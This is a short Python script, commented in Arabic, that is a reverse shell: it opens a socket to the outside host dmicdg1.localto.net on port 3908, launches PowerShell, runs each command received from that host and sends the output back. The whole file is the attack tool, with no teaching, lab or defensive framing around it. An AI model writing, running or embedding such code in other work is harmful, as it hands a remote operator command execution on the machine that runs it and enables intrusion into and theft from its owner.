import socket
import subprocess
import os

# إعداد عنوان IP والمنفذ
HOST = 'dmicdg1.localto.net'
PORT = 3908
# إنشاء socket
s = socket.socket()
s.connect((HOST, PORT))

# بدء PowerShell
p = subprocess.Popen(["powershell.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

while True:
    # قراءة الأوامر من socket
    command = s.recv(1024).decode()
    if command.lower() == 'exit':
        break

    # إرسال الأمر إلى PowerShell
    p.stdin.write(command + '\n')
    p.stdin.flush()

    # قراءة النتيجة من PowerShell
    output = p.stdout.read() + p.stderr.read()

    # إرسال النتيجة مرة أخرى إلى الخادم
    s.send(output.encode())

# إغلاق الاتصال
s.close()
